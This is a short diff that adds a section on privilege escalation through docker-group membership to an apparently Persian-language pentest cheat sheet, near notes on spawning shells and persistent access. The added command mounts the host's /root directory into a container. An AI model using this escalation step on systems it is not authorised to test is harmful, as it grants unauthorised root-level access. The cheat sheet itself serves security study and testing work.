@@ -289,6 +289,13 @@ exec "/bin/sh"
 
  [netsec.ws](http://netsec.ws/?p=337)
 
+### افزایش دسترسی با docker
+
+باید با کاربردی که عضو گروه docker است وارد شده باشید.
+
+```text
+docker run -v /root:/mnt -it ubuntu
+```
 
 ## دسترسی همیشگی
 
